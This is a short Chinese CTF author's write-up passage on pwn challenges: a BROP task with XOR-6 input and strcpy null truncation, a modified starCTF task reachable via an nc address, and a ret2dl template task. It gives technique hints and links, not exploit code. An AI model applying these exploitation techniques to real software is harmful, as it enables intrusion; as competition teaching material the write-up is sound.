**<a class="reference-link" name="%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"></a>出题思路**

虚假的pwn手出了一道虚假的pwn题，本题是CTF-One-For-All上面提供的源码，进行了修改，是一道BROP，对于输入的内容进行了异或6的操作，又因为这里采用了strcpy的操作，导致0截断，所以在作题过程中需要考虑到这两点，之后就意想不到的只有一队做出来，最后在自己复盘反思的时候发现，glibc版本还得盲猜，这个其实就有点微妙了，所以出题比较失败（给参加比赛的pwn爷跪下）

**<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>解题思路**

可以直接转向fmyy大师傅的博客了，[https://fmyy.pro/2020/06/15/Competition/DozerCTF/基本只能这么做。](https://fmyy.pro/2020/06/15/Competition/DozerCTF/%E5%9F%BA%E6%9C%AC%E5%8F%AA%E8%83%BD%E8%BF%99%E4%B9%88%E5%81%9A%E3%80%82)

### <a class="reference-link" name="%E9%85%B8%E8%8F%9C%E9%B1%BC"></a>酸菜鱼

<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>**题目描述**

我是酸菜鱼，又酸又菜又多余<br>
nc 118.31.11.216 30078

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**解题思路**

**starCTF**原题魔改，直接用他那个脚本打就没啥大问题

### <a class="reference-link" name="ret2%20temp"></a>ret2 temp

ret2dl模板题，直接打！
